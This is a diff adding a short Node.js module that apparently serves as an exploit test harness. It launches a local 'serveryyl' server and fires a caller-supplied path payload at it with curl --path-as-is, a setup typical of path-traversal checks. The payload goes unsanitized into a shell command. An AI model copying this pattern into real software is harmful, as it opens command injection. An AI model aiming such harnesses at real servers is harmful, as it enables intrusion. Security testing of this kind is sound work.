@@ -1,0 +1,25 @@
+function exploitFunction(payload) {
+    const { exec } = require("child_process");
+    const path = require("path");
+
+    const server = "node ./node_modules/serveryyl/index.js";
+    let exe = exec(server, (error, stdout) => {
+        if (error) {
+            console.error(`Error starting server: ${error}`);
+            return;
+        }
+        let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`; // Use the payload
+        exec(attack_string, (error, stdout) => {
+            if (error) {
+                console.error(`Error executing attack string: ${error}`);
+                return;
+            }
+            return stdout;
+        });
+    });
+
+    // Simulate a delay to wait for the server to start
+    return new Promise((resolve) => setTimeout(resolve, 2000));
+}
+
+module.exports = { exploitFunction };
